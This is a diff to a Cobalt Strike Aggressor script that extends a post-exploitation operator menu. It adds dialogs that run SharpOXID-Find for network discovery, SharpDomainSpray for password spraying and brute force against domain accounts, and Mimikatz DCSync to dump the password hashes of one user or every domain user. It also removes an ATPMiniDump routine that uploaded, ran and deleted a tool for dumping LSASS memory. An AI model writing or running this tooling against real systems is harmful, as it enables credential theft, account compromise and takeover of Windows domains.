@@ -26,45 +26,23 @@ sub internal_monologue{
 	$args = "-Downgrade True -Verbose True";
 	bexecute_assembly($1, $binary, $args);
 }		
-		
+			item "SharpOXID-Find" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
+			dialog_description($dialog, "OXID. -i IP ( -i 192.168.0.1 ). -c cidr (-c 192.168.0.1/24).");
+			drow_combobox($dialog, "type", "type:", @("-i","-c"));
+			drow_text($dialog, "ip", "ip:  ");			
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub SharpOXID-Find {
+	$arg = join(' ',  @($3['type'],$3['ip']));
+	bexecute_assembly($bid, script_resource("/script/SharpOXID-Find.exe"), $arg);
+}		
 		item "SharpHound3.0" {
 			bexecute_assembly($1, script_resource("/script/SharpHound.exe"), "");
 		}
 
-	    menu "ATPMiniDump" {
-			item "Upload ATPMiniDump" {
-				$bid = $1;
-				$dialog = dialog("Upload ATPMiniDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &ATPMiniDump);
-				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
-				dbutton_action($dialog, "Upload");
-				dialog_show($dialog);
-        }
-sub ATPMiniDump {
-
-    bcd($bid, $3['UploadPath']);
-        bupload($bid, script_resource("/script/ATPMiniDump.exe"));
-    
-
-}
-		  item "Run ATPMiniDump" {
-			$bid = $1;
-			$dialog = dialog("ATPMiniDump", %(bid => $bid), &ATPMiniDump_run);
-			dialog_description($dialog, "Use PssCaptureSnapShot - MiniDumpWriteDump to dump LSASS.");
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
-        }
-
-sub ATPMiniDump_run{
-	bshell($bid, "ATPMiniDump.exe");
-}
-
-        	item "Delete ATPMiniDump"{
-        	local('$bid');
-        	foreach $bid ($1){
-            	bshell($1, "del /f /s /q ATPMiniDump.exe");
-        	}
-		}
-		}
 
     	item "Mimikatz-pth"{
     		local('$bid');
@@ -115,7 +93,7 @@ sub sharpwmi_up {
 					drow_text($Dialog, "password", "password: ");
 					drow_text($Dialog, "type", "cmd/upload: ");
 					drow_text($Dialog, "cmd/path", "cmd/path: ");
-                    dbutton_action($Dialog, "运行");
+                    dbutton_action($Dialog, "RUN");
                     dialog_show($Dialog);
                 }
 
@@ -136,6 +114,39 @@ sub sharpwmi_run{
 		}
 }
 
+			item "SharpDomainSpray" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
+			dialog_description($dialog, "Brute force passwd (Pass2User: specific passwd to burte username. User2Pass: specific username to get passwd) .");
+			drow_text($dialog, "content", "content:  ");		
+			drow_combobox($dialog, "type", "type", @("-User2Pass", "-Pass2User"));
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub SharpDomainSpray {
+	$arg = join(' ', @($3['type'],$3['content']));
+	bexecute_assembly($bid, script_resource("/script/SharpDomainSpray/SharpDomainSpray.exe"), $arg);
+} 
+
+		 menu "Mimikatz-DCSync" {
+		 		item "Specific User" {
+		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "Domain" , user => "User") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
+		 			dialog_description($dialog,"Use Mimikatz to get Hash");
+		 			drow_text($dialog,"bid","Bid:");
+		 			drow_text($dialog,"domain","Domain:");
+		 			drow_text($dialog,"user","User:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+ 		 		}
+		 		item "All Users" {
+		 			$dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "Domain") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
+		 			dialog_description($dialog, "Dump All Hash");
+		 			drow_text($dialog, "domain","Domain:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+
+		 		}
+		 }
 
 
 		
